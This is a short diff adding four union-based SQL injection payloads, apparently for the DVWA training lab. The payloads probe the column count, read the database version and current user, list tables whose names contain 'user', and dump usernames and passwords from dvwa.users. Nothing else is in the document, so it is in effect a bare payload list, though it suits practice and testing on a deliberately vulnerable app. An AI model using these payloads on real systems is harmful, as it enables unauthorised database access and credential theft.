@@ -1,0 +1,4 @@
+1' union select 1,2 -- '
+1' union select @@version,current_user() -- '
+1' union select table_schema, table_name FROM information_schema.tables WHERE table_name LIKE '%user%' -- '
+1' union select user, password FROM dvwa.users -- '
